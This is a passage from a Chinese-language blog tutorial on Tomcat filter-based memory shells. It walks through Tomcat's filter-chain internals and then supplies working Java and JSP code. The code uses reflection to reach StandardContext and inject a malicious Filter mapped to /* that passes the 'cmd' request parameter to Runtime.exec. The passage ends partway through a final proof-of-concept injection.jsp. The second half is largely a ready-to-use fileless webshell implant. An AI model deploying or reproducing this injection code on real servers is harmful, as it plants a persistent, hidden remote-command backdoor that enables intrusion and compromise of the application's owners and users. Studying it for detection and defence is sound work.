<p>重点都标出来了，这里就是遍历filterMap。再来看一下这个for循环具体代码：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831171951500.png" alt="image-20240831171951500"></p>
<p>如果当前请求的url与FilterMap中的urlPattern匹配，就会调用 findFilterConfig 方法在 filterConfigs 中寻找对应 filterName名称的 FilterConfig，然后如果不为null，就进入else语句，将filterConfig添加到filterChain中，跟进一下这个ApplicationFilterChain类的addFIlter()方法：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831172128811.png" alt="image-20240831172128811"></p>
<p>很明显就是将filter都装进先前定义的ApplicationFilterChain的filters中。</p>
<p>————————</p>
<p><strong>filterChain实例赋值大概就是这样</strong>。</p>
<p>我们再回到StandardWrapperValve类中，在invoke之后的代码中，有调用filterChain 的 doFIlter() 方法，有两个，调试一下，发现确实会调用其中一个doFIlter()方法：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831172745244.png" alt="image-20240831172745244"></p>
<p>然后自然就会调用ApplicationFilterChain类的doFIlter()方法，然后调用internalDoFilter()方法，过程在前面的Filter链的也有说。</p>
<p>只不过这里还是有不同的：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831173230857.png" alt="image-20240831173230857"></p>
<p>这里的n就只为1，所以这里获取到的filter直接就是我们前面调用分析时最后的<strong>tomcat自带的WsFilter</strong>。</p>
<p><strong>后面也就是前面分析过了的，简单给给流程：</strong><br>WsFilter#doFilter &#x3D;&#x3D; &gt; ApplicationFilterChain#doFilter &#x3D;&#x3D;&gt; ApplicationFilterChain#internalDoFilter </p>
<p>然后同样调用了service()方法：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831173943681.png" alt="image-20240831173943681"></p>
<p>这里是<strong>因为我们访问的是&#x2F;，在&#x2F;路由我们没有自定义filter</strong>，所以这里就只会调用一次doFilter。</p>
<p>所以如果我们访问<code>/filter</code>路由，就还会进行一次上面的过程，只不过就是我们前面的分析Filter 链的流程。</p>
<h5 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h5><p>补充一下前面的createFilterChain()方法中获取context部分的地方，我这里是<strong>用上了自定义的两个filter</strong>，如下代码：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831195228597.png" alt="image-20240831195228597"></p>
<p>我们现在来看一下<strong>获取到的context的重点内容</strong>，加一个断点看一下（这里以我的自定义了两个filter为例）：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831195448827.png" alt="image-20240831195448827"></p>
<p>在这个StandardContext对象中包含了filterConfigs、filterDefs、filterMaps，现在来分别说明一下。</p>
<h6 id="filterConfigs"><a href="#filterConfigs" class="headerlink" title="filterConfigs"></a>filterConfigs</h6><p>在StandardContext中的定义为：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901124501407.png" alt="image-20240901124501407"></p>
<p>点开前面断点情况如下：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901124421253.png" alt="image-20240901124421253"></p>
<p>是以键值对的形式存储的，有三个，以一个为例：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831201155348.png" alt="image-20240831201155348"></p>
<p>可以看出filterConfigs包含了当前上下文的信息 StandardContext、filterDef等信息</p>
<p>这里的 filterDef 存放了filter 的定义，包括filterClass、filterName等信息。其实就是web.xml中的<code> &lt;filter&gt;</code>标签。</p>
<h6 id="filterDefs"><a href="#filterDefs" class="headerlink" title="filterDefs"></a>filterDefs</h6><p>它在StandardContext中的定义为：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901124322837.png" alt="image-20240901124322837"></p>
<p>点开如下：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901124651999.png" alt="image-20240901124651999"></p>
<p>filterDefs是一个HashMap，以键值对的形式存储 filterDef，点开其中一个看看：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831201641952.png" alt="image-20240831201641952"></p>
<h6 id="filterMaps"><a href="#filterMaps" class="headerlink" title="filterMaps"></a>filterMaps</h6><p>filterMaps 中就储存到了很多有用的信息，以array的形式存放了各filter的路径映射信息，其对应的是web.xml中的<code>&lt;filter-mapping&gt;</code>标签：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831202049163.png" alt="image-20240831202049163"></p>
<p>这里我将自定义的两个filter标出来了。从中可以看出<strong>filter顺序是对的</strong>，也有一些必要的信息。</p>
<p>————</p>
<p>所以后面的获取filterMaps的代码:</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831202302689.png" alt="image-20240831202302689"></p>
<p>应该就是获取到就是filterMaps。</p>
<p>——————</p>
<p>从上面就可以看出来<strong>Context含有filter的必要信息</strong>。</p>
<h5 id="如何攻击"><a href="#如何攻击" class="headerlink" title="如何攻击"></a>如何攻击</h5><h6 id="动态注册Filter"><a href="#动态注册Filter" class="headerlink" title="动态注册Filter"></a>动态注册Filter</h6><p>从前面的分析可以知道，只要我们向web.xml中注册一个filter，然后我们将这个filter对应代码设置成恶意代码，就能实现命令注入。</p>
<p>但是在实际环境中是不可能有这种情况的。那么该如何解决呢。</p>
<p>在前面的分析中，我们分析了ApplicationFilterChain的filters的赋值过程，调用了ApplicationFilterFactory类的createFilterChain()方法，其中的<strong>filterMaps即为其中重要的一环</strong>。</p>
<p>既然<strong>关键都是filterMaps了，那么这里同样的很关键的变量就是context</strong>：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831210610244.png" alt="image-20240831210610244"></p>
<p>这里就会获取到StandardContext实例。</p>
<p>所以我们可以<strong>借用Java反射来修改filterConfigs，filterDefs，filterMaps这三个变量</strong>，将我们恶意构造的FIltername以及对应的urlpattern存放到FilterMaps，从而达到内存注入的操作</p>
<p><strong>说明一下动态添加恶意Filter的思路</strong>：</p>
<ol>
<li>获取当前web应用的StandardContext对象</li>
<li>创建恶意Filter</li>
<li>使用FilterDef对Filter进行封装，并添加必要的属性</li>
<li>创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中</li>
<li>使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中。</li>
</ol>
<h6 id="获取StandardContext对象"><a href="#获取StandardContext对象" class="headerlink" title="获取StandardContext对象"></a>获取StandardContext对象</h6><p>StandardContext对象主要用来管理Web应用的一些全局资源，如Session、Cookie、Servlet等。因此有很多方法来获取StandardContext对象。</p>
<p>这里要用到ServletContext，简单说明一下ServletContext跟StandardContext的关系：</p>
<p>Tomcat中实现ServletContext接口的有如下三个：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831212433092.png" alt="image-20240831212433092"></p>
<p>（内表示继承的父类实现了接口但本类没有直接引入接口）</p>
<p>这里重点关注ApplicationContext类和ApplicationContextyFacade类。</p>
<p><strong>在web应用中获取的ServletContext实际上是ApplicationContextFacade对象</strong>，对ApplicationContext进行了封装：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831214051758.png" alt="image-20240831214051758"></p>
<p>而ApplicationContext实例中又包含了StandardContext实例：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831214339678.png" alt="image-20240831214339678"></p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831214306688.png" alt="image-20240831214306688"></p>
<p>当我们能直接获取 request 的时候，可以直接将Servlet 转为 StandardContext，从而获取context。</p>
<p><strong>获取context流程如下：</strong></p>
<p><u>ServletContext -&gt; ApplicationContext：</u></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> rerquest.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">context0</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">context0.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext)context0.get(servletContext);</span><br></pre></td></tr></table></figure>

<p>这里是为了获取到(ApplicationContext)context，即context变量对应的ApplicationContext类实例。</p>
<p><u>ApplicationContext -&gt; StandardContext：</u></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext)context1.get(applicationContext)</span><br></pre></td></tr></table></figure>

<p>这里是为了获取到(StandardContext)context，所以现在我们就获取到了StandardContext类型的context，和前面createFilterChain()方法中获取到的context变量对应。</p>
<h6 id="创建恶意filter"><a href="#创建恶意filter" class="headerlink" title="创建恶意filter"></a>创建恶意filter</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Filter</span> <span class="variable">evilFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            String cmd;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((cmd = servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>)) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">                runtime.exec(cmd);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>

<h6 id="如何封装"><a href="#如何封装" class="headerlink" title="如何封装"></a>如何封装</h6><p>既然前面我们获取到了StandardContext型的context，在前面的补充中，也说明这个context变量中很重要的三点：filterConfigs、filterDefs、filterMaps。</p>
<p>所以其实这里的重点就是如何更改这三个变量从而在createFilterChain()方法中获取filterMaps时可以加入恶意的filter。</p>
<p><strong>看StandardContext源码，先说明其中几个方法</strong>：</p>
<p><strong>addFilterDef()</strong></p>
<p>添加一个<strong>filterDef</strong>到Context：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831220924498.png" alt="image-20240831220924498"></p>
<p>这里的filterDefs变量定义：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831221127977.png" alt="image-20240831221127977"></p>
<p>所以就是添加一个键值对进去。</p>
<p><strong>addFilterMapBefore</strong></p>
<p>添加<strong>filterMap</strong>到所有filter最前面：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831221334165.png" alt="image-20240831221334165"></p>
<p><strong>ApplicationFilterConfig</strong></p>
<p>还有个就是<strong>filterConfigs</strong>，但是这个不是单纯的一个add…就可以加入，代码如下：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831222245447.png" alt="image-20240831222245447"></p>
<p>再看一下filterConfigs变量的定义：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831222352219.png" alt="image-20240831222352219"></p>
<p>所以同样是放入键值对。</p>
<p>从代码中可以看出在这里会调用ApplicationFilterrConfig的构造方法：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831222552209.png" alt="image-20240831222552209"></p>
<p>————————————</p>
<p>现在就可以开始尝试构造了：</p>
<p><strong>FilterDef</strong></p>
<p><strong>这个类位于</strong><code>org.apache.tomcat.util.descriptor.web.FilterDef;</code>，我们可以实例化一个FilterDef对象，并将恶意构造的恶意类添加到filterDef中：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//前面创建恶意filter是用的匿名内部类的方式创建的，当然也可以直接public声明一个恶意的filter类，利用方式不同而已。</span></span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;badFilter&quot;</span>;</span><br><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line"><span class="comment">//设置filter名称</span></span><br><span class="line">filterDef.setFilterName(name)</span><br><span class="line"><span class="comment">//声明filter类代码源</span></span><br><span class="line">filterDef.setFilterClass(evilFilter.getClass().getName());</span><br><span class="line">filterDef.setFilter(evilFilter);</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加filterDef</span></span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br></pre></td></tr></table></figure>

<p>可以和前面补充里给出的相对应的filteDefs的图片对比一下，大概就能知道这里使用的方法是干嘛的。</p>
<p><strong>filterMaps</strong></p>
<p><strong>这个类位于</strong><code>org.apache.tomcat.util.descriptor.web.FilterMap</code>，在这里我们需要实例化一个FilteMap对象，并将filteMap添加到所有filte最前面：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line"><span class="comment">//设置拦截路由</span></span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//name=badFilter</span></span><br><span class="line">filterMap.setFilterName(name);</span><br><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加我们的filterMap到所有filterr最前面</span></span><br><span class="line">standardContext.addFilterMapBefore(filterMap);</span><br></pre></td></tr></table></figure>

<p>这里重点解释一下<code>filterMap.setDispatcher(DispatcherType.REQUEST.name());</code>，这个方法是用来设置FilterMap的当前状态，该状态表示何时应用过滤器。在这里表示一个直接的客户端请求，也就是当用户直接请求一个资源或者重定向到达该资源时，会触发过滤器。</p>
<p><strong>filterConfig</strong></p>
<p>filterConfigs中存放filterConfig的数组，并且从前面补充板块的图中，可以看出filterConfig中存放有filterDef和filte对象等信息。</p>
<p>先获取当前filterConfigs信息：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map)configs.get(standardContext);</span><br></pre></td></tr></table></figure>

<p>再通过反射获取ApplicationFilterConfig的构造器并初始化：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor1.newInstance(standardContext,filterDef);</span><br></pre></td></tr></table></figure>

<p>然后就是将这个实例化的ApplicationFilterConfig放进filterConfigs中，如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//name=badFilter</span></span><br><span class="line">filterConfigs.put(name,o);</span><br></pre></td></tr></table></figure>

<p>至此就已经全部分析完了。</p>
<h6 id="动态注入"><a href="#动态注入" class="headerlink" title="动态注入"></a>动态注入</h6><p>结合前面的分析，其实已经比较清楚了。总结的流程如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取ApplicationContext类型的context</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">facade</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field0</span> <span class="operator">=</span> facade.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext)field0.get(facade);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取StandardContext类型的context</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext)field1.get(applicationContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建恶意filter</span></span><br><span class="line">    <span class="type">Filter</span> <span class="variable">evilFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            String cmd;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((cmd = servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>)) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">                runtime.exec(cmd);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置基本的预定义的filtername</span></span><br><span class="line">  <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;badFilter&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建filterDef</span></span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilterName(name);</span><br><span class="line">    filterDef.setFilterClass(evilFilter.getClass().getName());</span><br><span class="line">    filterDef.setFilter(evilFilter);</span><br><span class="line"></span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建filterMap</span></span><br><span class="line">    <span class="type">FilterMap</span>  <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(name);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建filterConfig所需的ApplicationFilterConfig</span></span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">    constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor1.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line"><span class="comment">//放入filterConfigs</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterMaps</span> <span class="operator">=</span> (Map)configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    filterMaps.put(name,o);</span><br></pre></td></tr></table></figure>

<h6 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h6><p>injection.jsp</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: ASUS</span><br><span class="line">  Date: <span class="number">2024</span>/<span class="number">9</span>/<span class="number">1</span></span><br><span class="line">  Time: <span class="number">13</span>:<span class="number">34</span></span><br><span class="line">  To change <span class="built_in">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.String&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//获取ApplicationContext类型的context</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">facade</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field0</span> <span class="operator">=</span> facade.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext)field0.get(facade);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取StandardContext类型的context</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span 